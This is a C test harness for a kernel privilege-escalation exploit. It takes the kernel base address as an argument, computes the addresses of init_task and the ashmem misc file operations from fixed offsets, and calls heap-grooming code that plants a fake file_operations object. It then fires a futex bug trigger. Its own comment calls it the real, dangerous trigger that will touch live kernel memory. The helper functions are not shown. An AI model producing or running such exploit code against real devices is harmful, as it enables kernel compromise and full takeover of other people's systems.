/* Standalone test for groom_and_install_fops_object() + run_futex_trigger(),
 * using the REAL current-boot KASLR base (read via su/kallsyms as ground
 * truth, since tracefs is unreliable on this idle device this session --
 * see chat) instead of waiting on kaslr_locate_via_tracefs(). This is
 * the real, dangerous trigger: it WILL touch a real kernel object if it
 * reaches that point. Test harness only. Kernel base is passed on argv
 * so nothing here hardcodes a value across boots. */
#include <stdio.h>
#include <stdlib.h>

#include "futex_trigger.h"
#include "groom.h"

int main(int argc, char **argv) {
  if (argc != 2) {
    fprintf(stderr, "usage: %s <kernel_base_hex>\n", argv[0]);
    return 2;
  }
  uint64_t kernel_base = strtoull(argv[1], NULL, 16);
  uint64_t init_task_addr = kernel_base + 0x02c05080ULL;
  uint64_t ashmem_misc_fops_addr = kernel_base + 0x02bfcf28ULL;

  fprintf(stderr,
          "kernel_base=%016llx init_task=%016llx ashmem_misc_fops=%016llx\n",
          (unsigned long long)kernel_base, (unsigned long long)init_task_addr,
          (unsigned long long)ashmem_misc_fops_addr);

  uint64_t payload_base = groom_and_install_fops_object(
      kernel_base, ashmem_misc_fops_addr, init_task_addr);
  if (!payload_base) {
    fprintf(stderr, "groom failed\n");
    return 1;
  }
  printf("payload_base=%016llx\n", (unsigned long long)payload_base);

  int triggered = run_futex_trigger();
  printf("triggered=%d\n", triggered);
  return triggered ? 0 : 1;
}
